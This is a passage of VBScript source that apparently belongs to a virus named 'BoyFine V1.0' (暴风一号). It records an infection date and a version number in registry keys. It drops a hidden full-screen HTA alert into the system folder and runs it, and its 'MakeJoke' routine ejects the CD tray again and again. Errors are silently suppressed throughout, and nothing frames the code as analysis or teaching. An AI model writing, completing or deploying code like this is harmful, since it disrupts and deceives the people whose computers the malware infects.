
```vb
    Dim VerInfo  

    VerInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"  

    If ReadReg(VerInfo) = "" Then  

        GetVersion = 0  

    Else  

        GetVersion = CInt(ReadReg(VerInfo))  

    End If  

End Function  

Sub VirusAlert()  

    On Error Resume Next  

    Dim HtaPath, HtaCode  

    HtaPath = Fso.GetSpecialFolder(1) & "\\BFAlert.hta"  

    HtaCode="<HTML><HEAD><TITLE>暴风一号</TITLE>"&VBCRLF&"<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">"&VBCRLF&"</HEAD><BODY bgcolor=#000000><DIV align =""center"">"&VBCRLF&"<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>"&VBCRLF&"<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号</font>"&VBCRLF&"</DIV></BODY></HTML>"  

    If FSO.FileExists(HtaPath) = False Then  

        Call CreateFile(HtaCode, HtaPath)  

        Call SetHiddenAttr(HtaPath)  

    End If  

    Call Run(HtaPath)  

End Sub  

Function GetInfectedDate()  

    On Error Resume Next  

    Dim DateInfo  

    DateInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"  

    If ReadReg(DateInfo) = "" Then  

        GetInfectedDate = ""  

    Else  

        GetInfectedDate = CDate(ReadReg(DateInfo))  

    End If  

End Function  

Sub MakeJoke(ByVal Times)  

    On Error Resume Next  

    Dim WMP, colCDROMs  

    WMP = CreateObject("WMPlayer.OCX")  

    colCDROMs = WMP.cdromCollection  

    If colCDROMs.Count > 0 Then  

        For i = 1 To Times  

            colCDROMs.Item(0).eject()  

            WScript.Sleep(3000)  

            colCDROMs.Item(0).eject()  

        Next  

    End If  

    WMP = Nothing  

End Sub
```
